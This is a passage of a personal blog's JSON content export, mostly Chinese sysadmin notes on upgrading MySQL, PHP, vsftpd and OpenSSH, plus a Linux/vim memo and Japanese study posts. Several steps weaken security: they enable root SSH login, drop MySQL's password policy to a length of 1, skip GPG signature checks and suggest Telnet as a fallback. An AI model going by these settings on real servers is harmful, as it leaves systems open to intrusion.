后，使用mysql_upgrade升级数据库文件版本(必须是root用户喔!) 1sudo mysql_upgrade -uroot -p 重启mysql,并检查数据是否正常 123sudo service mysql restartmysqlcheck -uroot -p --all-databases 如果一切正常，所有表的检查结果均是ok状态。 同时，也可以进入mysql使用select version()； 来查看mysql-server 版本号。 更新过程中遇到的问题： 在ubuntu 14的版本中，安装了mysql 后，启动时，程序提示 “No directory, logging in with HOME=/”。 具体如下： 12345678root@xxx:/etc/mysql# service mysql restart \\* Stopping MySQL Community Server 5.7.11... \\* MySQL Community Server 5.7.11 is stopped \\* Re-starting MySQL Community Server 5.7.11No directory, logging in with HOME=/.. \\* MySQL Community Server 5.7.11 is started 解决办法： 123sudo service MySQL stopsudo usermod -d /var/lib/mysql/ mysqlsudo service mysql start 更新mysql版本后，所有的配置文件都会被删除，因此需要修改mysql配置说人话就是，远程是访问不到本数据库的 把 /etc/mysql/mysql.conf.d/mysql.cnf 配置文件中#bind-address =127.0.0.1 的注释符号去掉即可","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"运维/MySQL","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/MySQL/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"PHP upgrade, from 5.5.* to 7.2.*","slug":"2019/PHP_upgrade_from_5.5.*_to_7.2.24","date":"2019-07-02T17:16:24.000Z","updated":"2021-06-09T02:06:10.809Z","comments":true,"path":"/p/2019/PHP_upgrade_from_5.5.*_to_7.2.24/","link":"","permalink":"https://tari.moe/p/2019/PHP_upgrade_from_5.5.*_to_7.2.24/","excerpt":"","text":"服务器版本 CentOS6备份(快照)首先卸载当前版本PHP1sudo yum remove php* 配置yum仓库在CentOS6/7升级PHP至7.* 需要开启Remi和EPEL仓库 123yum install epel-releaserpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装PHP7.2需要在yum中指定需要使用的相关仓库 1yum --enablerepo=remi-php72 install php 安装完成后检查 PHP 版本 1php -v 安装相关 PHP 模块1yum --enablerepo=remi-php72 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-fpm 这里有个小坑,我在安装php-gd的时候会弹出一下错误 123Error: Package: gd-last-2.2.5-5.el6.remi.x86_64 (remi-safe) Requires: libwebp.so.5()(64bit) You could try using --skip-broken to work around the problem 谷歌libwebp.so.5()(64bit)这个依赖项后发现以下两个链接 https://pkgs.org/download/libwebp.so.5()(64bit)https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html 于是顺势找到rpm包链接 http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm 安装它就好 1rpm -i it 接下来就可以启动php-fpm并设置为开机启动啦! 123sudo service php-fpm startchkconfig php-fpm on 如果需要,也把mysql服务装上,顺便启用它 123yum --enablerepo=remi-php72 install php-mysqlsudo service mysql restart","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"PHP","slug":"运维/PHP","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/PHP/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"「形容詞」","slug":"2019/「形容詞」","date":"2019-07-02T10:38:27.000Z","updated":"2021-04-02T02:13:31.280Z","comments":true,"path":"/p/2019/「形容詞」/","link":"","permalink":"https://tari.moe/p/2019/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/","excerpt":"","text":"「な形容詞」 「な形容詞」+ な + 名词 ，因此称为「な形容詞」&nbsp; 名词 + の + 名词 にぎやか：热闹的 「い形容詞」特徴：〜い い形容詞 + 名词例：大きい会社 肯定行 否定行 〜います 〜 **い**くないです 寒いです 寒くないです 辛い 暖かい 暑い （食べ）たいです","categories":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"vsftpd upgrade, from 2.2.2 to 3.0.3","slug":"2019/vsftpd_upgrade_from_2.2.2_to_3.0.3","date":"2019-07-01T07:33:24.000Z","updated":"2021-06-09T02:07:01.900Z","comments":true,"path":"/p/2019/vsftpd_upgrade_from_2.2.2_to_3.0.3/","link":"","permalink":"https://tari.moe/p/2019/vsftpd_upgrade_from_2.2.2_to_3.0.3/","excerpt":"","text":"记一次vsftpd 升级过程备份(快照)收集系统信息以及原有vsftpd安装版本信息123uname -arpm -qa | grep vsftpdvsftpd -v 卸载原 vsftpd1rpm -e vsftpd-****** GPG签名认证由于没用到公钥,因此跳过下面两条命令 12gpg -import publickeygpg -verify ***.asc(.sig) *** 解压后进行库文件相关设置安装之前,如果系统为64位，需要更改vsf_findlibs.sh文件库中lib 路径改为lib64 1sed -i &#x27;s/lib\\//lib64\\//g&#x27; vsf_findlibs.sh 编译安装由于没有相关依赖,因此不用进行预编译 1make &amp;&amp; make install 配置信息修改因为是升级安装，需要保留原来vsftp的相关配置，接下来需要复制些文件到相应vsftp目录。具体操作如下： 12cp vsftpd.conf /etc #配置主文件 cp RedHat/vsftpd.pam /etc/pam.d/ftp #PAM 认证文件 如果系统为64位，请将/etc/pam.d/ftp /lib目录替换为/lib64 1sed -i &#x27;s/lib\\//lib64\\//g&#x27; /etc/pam.d/ftp 将以下内容写入 /etc/vsftpd.conf 123anonymous_enable=NOlocal_enable=yeswrite_enable=YES 启动 vsftpd 进行测试1vsftpd /etc/vsftpd.conf &amp; 把 vsftpd 加入到开机启动项中将以下内容写入 /etc/rc.d/rc.local_enable 1vsftpd /etc/vsftpd.conf 修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建创建 /usr/share/empty 文件夹并将以下内容写入 /etc/vsftpd.conf 1secure_chroot_dir=/usr/share/empty 注意：如重启后不能启动服务修改 /etc/xinetd.d/vsftpd 文件，把 disable=no 改成 disable=yes 就行了 版本验证1vsftpd -v 参考自: https://blog.csdn.net/dbdeep/article/details/63037691","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"vsftpd","slug":"运维/vsftpd","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/vsftpd/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Openssh upgrade, from 7.5 to 8.0p1","slug":"2019/Openssh_upgrade_from_7.5_to_8.0p1","date":"2019-06-30T16:20:55.000Z","updated":"2021-06-09T02:06:00.302Z","comments":true,"path":"/p/2019/Openssh_upgrade_from_7.5_to_8.0p1/","link":"","permalink":"https://tari.moe/p/2019/Openssh_upgrade_from_7.5_to_8.0p1/","excerpt":"","text":"记一次OpenSSH升级过程系统环境: Ubuntu14.04sshd -D先是修改sshd配置允许root登录，但是重启不了 1sudo service ssh restart 查看得知存在 sshd -D 进程并终止它 12ps -ef | grep sshsudo kill ID 最后开启sshd 1sudo /usr/sbin/sshd -D 启动后就可以root登录了emmm…. 好像启动后只能登录一次?那请试试: 1sudo /usr/sbin/sshd -t 好奇的我想知道-D是什么意思…但看了说明也不知道为什么系列。。-D When this option is specified, sshd will not detach and does not become a daemon. This allows easy monitoring of sshd. 会不会和这有关呢? (摘自官网)OpenSSH runs as two processes when connecting to other computers. The first process is a privileged process and controls the issuance of privileges as necessary. The second process communicates with the network. 快照别忘了备份、别忘了备份、别忘了备份… 卸载原本OpenSSH由于我原本是编译安装的，到原本编译安装的目录卸载就可以了 1make uninstall 下载OpenSSH到官网下载就可以了http://www.openssh.com/releasenotes.html SHA1值检验1sha1sum openssh-8.0p1.tar.gz 相关依赖包pam pam-devel zlib zlib-devel openssl-devel 注意下ubuntu下pam是 libpam0g、pam-devel 是 libpam0g-dev编译安装1./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-pam --with-zlib --with-ssl-dir=/usr/local/ssl --with-privsep-path=/var/lib/sshd 1make &amp;&amp; make install 重启服务器，搞定！","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"memo","slug":"2019/memo","date":"2019-06-29T16:17:36.000Z","updated":"2021-04-02T02:17:01.656Z","comments":true,"path":"/p/2019/memo/","link":"","permalink":"https://tari.moe/p/2019/memo/","excerpt":"","text":"记录 linux 一些常见问题一、某端口是否被 Linux 防火墙阻止-L: 查看管理命令子命令:&emsp;-n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。&emsp;-v：显示详细信息 1iptables -vnL | grep &#x27;:port&#x27; 二、^字符对上一个命令的文本替换并重新执行命令^before^after^ 三、vim系列 vim 字符串替换 12345678910111213141516171819:s/well/good/ 替换当前行第一个well 为 good:s/well/good/g 替换当前行所有well 为 good:n,$s/well/good/ 替换第 n 行开始到最后一行中每一行的第一个 well 为 good:n,$s/well/good/g 替换第 n 行开始到最后一行中每一行所有 well 为 goodn 为数字，若 n 为 .，表示从当前行开始到最后一行:%s/well/good/ （等同于 :g/well/s//good/） 替换每一行的第一个 well 为 good:%s/well/good/g （等同于 :g/well/s//good/g） 替换每一行中所有 well 为 good特殊符号转义：可以使用#作为分隔符，此时中间出现的 / 不会作为分隔符:s#well/#good/# 替换当前行第一个 well/ 为 good/:%s#/usr/bin#/bin#g 可以把文件中所有路径/usr/bin换成/bin vim 乱码问题其中-b一般是用来查看对应的二进制文件 1vim -b file vim tab 设置为4个空格vimrc文件末尾加上 123set ts=4set expandtabset autoindent vim 多行注释 首先按 esc 进入命令行模式下，按下 Ctrl + v，进入列（也叫区块）模式; 在行首使用上下键选择需要注释的多行; 按下键盘（大写）“I” 键，进入插入模式； 然后输入注释符（“//”、“#”等）; 最后按下 “Esc” 键。 注：在按下esc键后，会稍等一会才会出现注释，不要着急时间很短的~ vim 去掉高亮底色进入命令模式, 输入 1:nohl vim 除了 i o 外的其他插入 I 在光标当前行开始插入 a 在光标后插入 A 在光标当前行末尾插入 O 在光标当前行的上一行插入新行 vim 定位命令 :set nu 显示行号 :set nonu 取消行号 vim 替换和取消命令 r 替换光标所在处的字符 R 从光标所在处开始替换,按Esc键结束 vim 删除命令(一直傻傻的按远远的del键..) x 删除光标所在处命令 nx 删除光标所在处后的n个字符 dG 删除光标所在行到末尾行的所有内容 D 删除光标所在处到行尾的内容 :n,md 删除制定范围的行 vim 常用快捷键 Shift + zz 保存退出, 与 “:wq” 作用相同 V 进入行可视模式 Ctrl + v 进入块可视模式 vim 鼠标右键不能复制粘贴，而是切为可视化模式 全局改变 vim /etc/vimrc 仅改变当前用户 vim ~/.vimrc 注意事项: source 这一行的功能是加载默认配置，一定要先确定该文件路径存在 (根据vim版本确实vim7*,8*)，否则可能会导致 vim 不可用12345source /usr/share/vim/vim81/defaults.vimlet skip_defaults_vim = 1if has(&#x27;mouse&#x27;) set mouse-=aendif 重新打开 vim 就可以正常使用鼠标右键复制粘贴了 转载自: https://xirikm.net/2019/504-1.html 八、linux终端锁屏与解锁ctrl+s 锁屏ctrl+q 解锁 九、Sublime Text 3 垂直选取Shift+鼠标右键 十、MySQL统计所以库数据大小（有点慢喔）12345SELECT TABLE_SCHEMA, concat(TRUNCATE(sum(data_length)/1024/1024,2),&#x27;MB&#x27;) AS data_size,concat(TRUNCATE(sum(index_length)/1024/1024,2),&#x27;MB&#x27;) AS index_sizeFROM information_schema.TABLESGROUP BY TABLE_SCHEMAORDER BY data_length DESC; 十一、用户加组1usermod -aG group user 十二、探测服务是否已经启动, 运行是否正常1killall -0 service 十三、deb 和 rpm 包之间的转换1sudo apt install alien 十四、查看自己的 pts1who am i 十五、创建目录结构12# -v 显示做了什么mkdir -pv path/&#123;dir1, dir2, ...&#125; 十六、查看 nginx 的组和用户并锁定其不能用 ssh 登录12345678# 查看组getent group nginx# 查看用户getent passwd nginx# 查看nginx属于哪个组id nginx# 锁定 nginx 不能登录usermod -s /sbin/nologin nginx 十七、锁定nginx用户不能登录1passwd -l 十八、mysql密码强度设置1234mysql&gt; set global validate_password_policy=0;mysql&gt; set global validate_password_length=1;# 设置 root&#x27;@&#x27;localhost 的密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;; 十九、MySQL查看所有连接的客户端ip1234567891011SELECT user, host from mysql.user;# 或者SELECT substring_index(HOST, &#x27;:&#x27;, 1) AS host_name, state, count(*)FROM information_schema. PROCESSLISTGROUP BY state, host_name; 二十、编码转换1234# 在 linux 下打开 windows 的 txt 可能乱码iconv -f GBK -t UTF-8 文件名字# gedit 乱码可尝试gsettings set org.gnome.gedit.preferences.encodings candidate-encodings &quot;[&#x27;GB18030&#x27;, &#x27;UTF-8&#x27;, &#x27;CURRENT&#x27;, &#x27;ISO-8859-15&#x27;, &#x27;UTF-16&#x27;]&quot; 二十一、批量图片大小转换1find ./ -name &#x27;*.jpg&#x27; -exec convert -resize 1100x2200 &#123;&#125; &#123;&#125; \\; 二十一、五 弄一个读取速度很快很快的小硬盘12mkdir -p /mnt/rammount -t tmpfs tmpfs /mnt/ram -o size=8192M 二十二、don’t add command to history (note the leading space)1echo &quot;Am I like a hacker?&quot; 二十三、exit terminal but leave all processes running1disown -a &amp;&amp; exit 二十四、script 回放1234# 开始录像，ctrl+d或者exit结束script -t 2&gt;demo.time -a demo.his# 回放scriptreplay demo.time demo.his 二十五、 搜索历史记录ctrl + r我天，这么好用的命令我居然一直很少用。。。 二十六、 V2ray1234567# 系统时间sudo date -s 2019/10/27 sudo date -s 16:36:10# 或sudo pacman -S openntpdsudo systemctl enable openntpdsudo systemctl start openntpd 二十七、archlinux vmware12# 每次更新完内核都要使用如下命令重新编译内核模块的sudo vmware-modconfig --console --install-all 二十八、linux写入 ntfs 文件需要安装 ntfs-3g 二十九、sudo git 导致root用户和其他用户git配置不一致sudo 也不是乱用的晕。。。 1234567891011*** Please tell me who you are.Run git config --global user.email &quot;you@example.com&quot; git config --global user.name &quot;Your Name&quot;to set your account&#x27;s default identity.Omit --global to set the identity only in this repository.fatal: unable to auto-detect email address (got &#x27;root@****.(none)&#x27;) 三十、 archlinux 中一个网卡多ip可能会导致不同服务ip冲突导致网速下降123456789# 查看一个网卡是否存在多个ipip addr# 如果存在多个 ip 可能是系统装有多个网络管理造成的, 我是把 dhcpcd 关了 再 配合静态ip就好了systemctl stop dhcpcdsystemctl disable dhcpcd# 然后重启shutdown -r now 三十一、 linux 下 pycharm 用 matplotlib 库中文乱码 及 减号方块问题123# 查看 matplotlib 字体及配置文件目录import matplotlib CONFIG_DIR = print(matplotlib.matplotlib_fname()) 1234567891011121314# https://fontzone.net/download/simhei 下载 simhei 字体# 把字体拷贝到 matplotlib 字体目录# 要注意你新下载字体的用户及用户组的权限和该目录下一致cp DOWNLOAD_DIR/simhei.ttf CONFIG_DIR/fonts/ttf/ vim CONFIG_DIR/matplotlibrc # matplotlib 配置文件目录# 找到相应位置并 修改为下面三项font.family : sans-seriffont.sans-serif : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serifaxes.unicode_minus:False #作用就是解决负号&#x27;-&#x27;显示为方块的问题# 删除原本字体缓存cd ~/.cache/matplotlibrm -rf *.* 12345678# coding: utf-8import matplotlib.pyplot as pltplt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;SimHei&#x27;]mpl.rcParams[&#x27;axes.unicode_minus&#x27;] = False# 应该就 OK 了","categories":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"「助詞」","slug":"2019/「助詞」","date":"2019-06-29T08:42:22.000Z","updated":"2021-04-02T02:13:34.661Z","comments":true,"path":"/p/2019/「助詞」/","link":"","permalink":"https://tari.moe/p/2019/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/","excerpt":"","text":"助詞「は」l— 主語は 一个句子只能有一个l— 表示区别对比例：明日は働きません 私は野菜と魚を食べます。肉は食べません [私は]土曜日は友達と食事します。日曜日は働きます 助詞「に」l— 表示動作進行時点 具体时间要放「に」（八時に、午後四時に）〜 ます例：１０時に友達と食事します。 泛指时间不用放「に」（明日）〜 ます 可放可不放「に」月曜日 火曜日 水曜日 木曜日 金曜日 土曜日 日曜日 l— 表示存在位置 重点是 东西或人/动物 存在位置 + に + 东西 + が あります例：机の上にリンゴがあります a：京都に何があります b：古いお寺や神社[など]が あります 存在位置 + に + 人/动物 + が います例：あそこに子供がいます a：部屋に誰がいます b：田中さんがいます 重点是 位置 东西 + は + 存在位置 + に + が あります例：a：トイレはどこにありますか&emsp;&emsp;b：2階にあります/2階です 人/动物 + は + 存在位置 + に + が います例：a：田中さんはどこにいますか&emsp;&emsp;b：＿＿＿＿＿会議室にいます l— 当动作一个人完成不了时动作主 + は + 动作对方 + に +动作对象 + を + 动词例：私は友達に電話を掛けました&emsp;&emsp;[私は]友達にCDを貸しました&emsp;&emsp;私はFAXで会社にレポートを送りました 例：私は母にカードをあげました&emsp;&emsp;私は母にセーターを貰いました 收到&emsp;&emsp;母は私にセーターをくれました 给(我)&emsp;&emsp;× 母は私にセーターをあげました&emsp;&emsp;因为日本人比较谦虚, 给别人的时候要 「上げ」, 就是比较熟的人也是如此, 别人给我时是 「クレ」&emsp;&emsp;例：友達は私の妹に本をくれました&emsp;&emsp;&emsp;&emsp;私は父にネクタイをあげました l— 表示分配時間期間 + に + 次数 例：一週間に２回日本語を勉強しますa：一周間に何回英語を勉強しますかb：4回勉強します。1回に4時間勉強しますa：じゃあ、一週間に１６時間ですね。すごいですね 助詞「で」l— 表示動作進行地点 場所 + で + 動詞 〜 ます在…例：駅の前で会いましょう。 一个人做什么什么一人で 表示交通工具（搭乘～，开～，骑～， 坐～）例：電車で行きます 要搭电车去 l— 用…工具(方法)例：私はFAXで会社にレポートを送りました 助詞「と」l— 和（跟）…例：日曜日、[あなたは]誰と食事しますか。 [私は]高校時代の友達と食事します。 l— 表并列 和 机の上に本とノートがあります 表示桌子上只有书和备忘录 机の上に本やノート[など(等)]があります 表示桌子上有书、备忘录等 助詞「を」 表示动作作用对象(看得见的动作) 対象 + を + 動作例：日本語を勉強します 助詞「が」 対象 + が（表示焦点）+ 状態動詞 例：日本語が分かります&emsp;&emsp;私はお金が全然ありません 時制 - 肯定 否定 現在 〜ます 〜ません 過去 〜ました 〜ませんでした 語気 ませんか要不要 例：一緒に[動詞]ませんか&emsp;&emsp;ええ、[ ]ましょう&emsp;&emsp;すみません、ちょっと… その他 歩いて走路去 总是 いつも 经常 よく 有时候 時々 不常 あまり＿＿ません 完全不 全然＿＿ません 理由原因から、＿＿＿＿＿＿例：お金がありませんから、どこも行きたくないです&emsp;&emsp;日本のアニメが好きですから、日本語を勉強します&emsp;&emsp;a：どうして、昨日、学校へ来ませんですか&emsp;&emsp;b：疲れましたから もう 已经例：もう晩ご飯を食べましたか&emsp;&emsp;はい、もう食べました&emsp;&emsp;いいえ、まだです&emsp;&emsp;20時ですね、もう帰ります&emsp;&emsp;a：もうあの映画を見ましたか&emsp;&emsp;b：いいえ、まだです。明日友達と見ます&emsp;&emsp;a：21時ですよ、帰りませんか&emsp;&emsp;b：そうですね、帰りましょう","categories":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"Openssh upgrade, from 7.5 to 7.9","slug":"2019/Openssh upgrade, from 7.5 to 7.9","date":"2019-06-24T02:54:44.000Z","updated":"2021-06-09T02:06:05.688Z","comments":true,"path":"/p/2019/Openssh upgrade, from 7.5 to 7.9/","link":"","permalink":"https://tari.moe/p/2019/Openssh%20upgrade,%20from%207.5%20to%207.9/","excerpt":"","text":"记一次OpenSSH升级过程系统环境: Ubuntu14.04 如果服务器并非采用云虚拟平台，最好先启用并测试SSH以外的连接方式（如Telnet）是否能够正常使用，如果SSH安装失败会连不上服务器（别问我怎么知道的…） 删除旧版本的openssh版本文件及旧版本的openssl（1、记得先备份好 2、如果zlib版本适应当前版本OpenSSH，可以不用更新） Wget openssh7.9p1、openssl1.1.1 和 perl5.26安装包 先编译安装perl,记得备份旧的perl，再创造新的软链接Perl -v进行测试 编译安装openssl，openssl version测试不成功到bin目录下./openssl version，报文件加载出错备份并重新创建新的libssl.so.1.1和libcrypto.so.1.1软链接再次bin目录下./openssl version成功备份并创建新的openssl软链接Openssl version进行测试 编译安装openssh 修改ssh配置文件允许root用户登录","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"ゴーストルール","slug":"2019/ゴーストルール","date":"2019-06-24T02:33:33.000Z","updated":"2021-04-02T02:19:36.940Z","comments":true,"path":"/p/2019/ゴーストルール/","link":"","permalink":"https://tari.moe/p/2019/%E3%82%B3%E3%82%99%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/","excerpt":"","text":"‘メーデー’の意味この前、ゴーストルールを聴きました、その歌詞の中 ’メーデー’ がありますどういう意味なのか？ その意味について考えがあります。 グーグルで、このような言葉がある：Mayday is an emergency procedure word used internationally as a distress signal in voice-procedure radio communications. 遭難信号のことですか？エエエエエ、、全然分からない 最後にこのリンクを見つけました ゴーストルール歌詞の意味つまり、主人公は遭難していて、だれかに見つけてもらいたいと信号を送っているのです。 そんな遭難信号を送っておきながら、僕は見つけられても抱き締めなくていいと言っています。 一方で、僕に気づいたら笑いかけて欲しいと願っています。 これは、僕が抱きしめることのできない存在だということを言っているのではないでしょうか？","categories":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"Deploy WordPress, ThinkPHP5 and general system in Nginx","slug":"2019/maintence","date":"2019-06-23T16:01:51.000Z","updated":"2021-06-09T00:35:42.077Z","comments":true,"path":"/p/2019/maintence/","link":"","permalink":"https://tari.moe/p/2019/maintence/","excerpt":"","text":"记一次Nginx上同时部署WordPress、 ThinkPHP5 和 普通系统，其中WordPress使用目录多站点这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。 wordpress本身路由特点，wordpress在建站时会把网站的根地址存在数据库的wp_options表的siteurl、home、ossdl_off_cdn_url和ossdl_off_blog_url字段中，路由都是从数据库中读取。所以nginx无论怎么修改配置都是测试不了问题的。 wordpress域名多站点与目录多站点存在着不同之处，安装wp目录多站点时，必须要停用所有插件再开启。 wp目录多站点的重写规则，由于wp路由的特殊性，wp在nginx的配置会覆盖其他系统的配置，所以访问uri时必须首先重写其他系统的uri。又由于存在wp，tp5，以及原生系统，三种不同路由的规则，一开始服务器配置又经过许多人手，配置起来比较凌乱。 由于在编译安装nginx时，没有装上echo输出，在我们调试正则表达式规则重写uri时候带来了很多麻烦，需要改不同的正则表达式，然后查看log文件，站点访问情况等摸索它的重写规律。 以下是配置文件内容:RoomReserver 是普通系统，tpmas是ThinkPHP5系统12345678910111213141516171819202122232425#RoomResever rewrite rulerewrite ^/RoomReserve/(.*)$ /RoomReserve/$1 break;#tpmas rewrite ruleif ( $request_uri ~* /tpmas/ ) &#123; rewrite ^/tpmas/public/index.php/(.*)$ /tpmas/public/index.php?s=/$1 last; break; #rewrite ^/tpmas/public/index.php/(.*)$ /tpmas/public/index.php?s=/$1 last; break;&#125;#wordpress rewrite rulerewrite ^/([_0-9a-zA-Z-]+/)?wp-admin$ /$1wp-admin/ permanent;if (-f $request_filename)&#123;set $rule_2 1;&#125;if (-d $request_filename)&#123;set $rule_2 1;&#125;if ($rule_2 = &quot;1&quot;)&#123;#ignored: “-” thing used or unknown variable in regex/rew&#125;rewrite ^/([_0-9a-zA-Z-]+/)?(wp-(content|admin|includes).*) /$2 last;rewrite ^/([_0-9a-zA-Z-]+/)?(.*.php)$ /$2 last;rewrite /. /index.php last;","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"运维/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Hello World","slug":"2019/hello-world","date":"2019-06-22T16:23:37.000Z","updated":"2021-04-01T08:25:34.475Z","comments":true,"path":"/p/2019/hello-world/","link":"","permalink":"https://tari.moe/p/2019/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"容器逃逸","slug":"云安全/容器逃逸","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"漏洞复现","slug":"云安全/容器逃逸/漏洞复现","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Docker","slug":"云安全/Docker","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/Docker/"},{"name":"考证","slug":"考证","permalink":"https://tari.moe/categories/%E8%80%83%E8%AF%81/"},{"name":"CISP","slug":"考证/CISP","permalink":"https://tari.moe/categories/%E8%80%83%E8%AF%81/CISP/"},{"name":"开发","slug":"云安全/Docker/开发","permalink":"https://tari.moe/categories/%E4%BA%91%E5%AE%89%E5%85%A8/Docker/%E5%BC%80%E5%8F%91/"},{"name":"后渗透","slug":"后渗透","permalink":"https://tari.moe/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"权限提升","slug":"后渗透/权限提升","permalink":"https://tari.moe/categories/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"vulnhub","slug":"后渗透/权限提升/vulnhub","permalink":"https://tari.moe/categories/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/vulnhub/"},{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"sqli-labs","slug":"ctf/sqli-labs","permalink":"https://tari.moe/categories/ctf/sqli-labs/"},{"name":"GraphQL","slug":"GraphQL","permalink":"https://tari.moe/categories/GraphQL/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"小记","slug":"总结/小记","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"},{"name":"HTB","slug":"HTB","permalink":"https://tari.moe/categories/HTB/"},{"name":"人工智能","slug":"人工智能","permalink":"https://tari.moe/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"ignition","slug":"漏洞复现/ignition","permalink":"https://tari.moe/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ignition/"},{"name":"Laravel8","slug":"漏洞复现/ignition/Laravel8","permalink":"https://tari.moe/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ignition/Laravel8/"},{"name":"面白i安全小记","slug":"面白i安全小记","permalink":"https://tari.moe/categories/%E9%9D%A2%E7%99%BDi%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"},{"name":"hackme","slug":"ctf/hackme","permalink":"https://tari.moe/categories/ctf/hackme/"},{"name":"ctf练习","slug":"ctf/hackme/ctf练习","permalink":"https://tari.moe/categories/ctf/hackme/ctf%E7%BB%83%E4%B9%A0/"},{"name":"SDL","slug":"SDL","permalink":"https://